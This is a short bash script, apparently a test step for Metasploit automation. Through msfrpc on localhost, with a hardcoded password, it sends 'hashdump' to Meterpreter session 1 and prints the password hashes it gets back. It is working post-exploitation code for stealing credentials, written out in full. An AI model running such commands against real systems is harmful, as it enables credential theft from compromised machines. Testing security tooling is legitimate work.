#!/bin/bash 

REQFILE="ebsessiongood.var"

if [ ! -f $REQFILE ]
then
	echo "Requisite file not found, SKIP"
	exit 1
fi

FEAT="session-migrate"

msfrpc -a 127.0.0.1 -P letmein <<EOF
irb_context.echo = false
rpc.call('session.meterpreter_write', 1, "hashdump")
data = rpc.call('session.meterpreter_read', 1)['data']
while data.empty? do sleep 2; data = rpc.call('session.meterpreter_read', 1)['data'] end
puts data
exit
EOF

